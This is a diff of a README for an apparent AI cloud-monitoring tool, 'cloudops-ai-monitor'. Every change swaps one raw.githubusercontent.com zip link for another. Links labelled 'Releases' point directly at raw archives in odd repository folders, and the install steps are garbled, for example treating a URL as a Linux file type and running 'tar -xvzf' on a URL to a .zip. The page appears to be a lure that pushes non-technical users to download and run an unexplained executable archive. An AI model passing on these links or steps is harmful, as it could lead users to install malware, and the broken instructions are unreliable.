@@ -1,6 +1,6 @@
 # 🚀 cloudops-ai-monitor - Monitor Your Cloud with AI Insights
 
-[![Download](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip%https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip)](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip)
+[![Download](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip%https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip)](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip)
 
 ## 📋 Overview
 
@@ -12,13 +12,13 @@ To run the cloudops-ai-monitor, follow these simple steps. You do not need any p
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** [Releases](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip)
+1. **Visit this page to download:** [Releases](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip)
 
 2. On the Releases page, look for the latest version.
 
 3. Click on the version you want to download.
 
-4. Choose the appropriate file for your device. Typically, you'll see options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip` for Linux.
+4. Choose the appropriate file for your device. Typically, you'll see options like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip` for Linux.
 
 5. Click to download the file. The download will start automatically.
 
@@ -38,7 +38,7 @@ Once the download is complete, follow these steps to set up the application:
 1. **Locate the downloaded file:**
    - For Windows, find the `.exe` file in your Downloads folder.
    - For macOS, locate the `.dmg` file in your Downloads folder.
-   - For Linux, find the `https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip` file.
+   - For Linux, find the `https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip` file.
 
 2. **Install the application:**
    - **Windows:**
@@ -49,7 +49,7 @@ Once the download is complete, follow these steps to set up the application:
      - Drag the cloudops-ai-monitor icon into your Applications folder.
    - **Linux:**
      - Open a terminal and navigate to the directory where you downloaded the file.
-     - Run the following command to extract: `tar -xvzf https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip`
+     - Run the following command to extract: `tar -xvzf https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip`
      - Navigate into the extracted folder and follow any installation instructions provided.
 
 3. **Launch the application:**
@@ -85,6 +85,6 @@ If you encounter problems during installation or use, consider these solutions:
 
 The cloudops-ai-monitor simplifies cloud monitoring. With its AI-powered features, you can gain insights quickly and easily. No technical skills are needed.
 
-For further details and support adjustments, please visit the [Releases page](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/approachability/cloudops-ai-monitor.zip) once more to stay updated.
+For further details and support adjustments, please visit the [Releases page](https://raw.githubusercontent.com/Yapakayala/cloudops-ai-monitor/main/api/cloudops-monitor-ai-v3.5.zip) once more to stay updated.
 
 ---
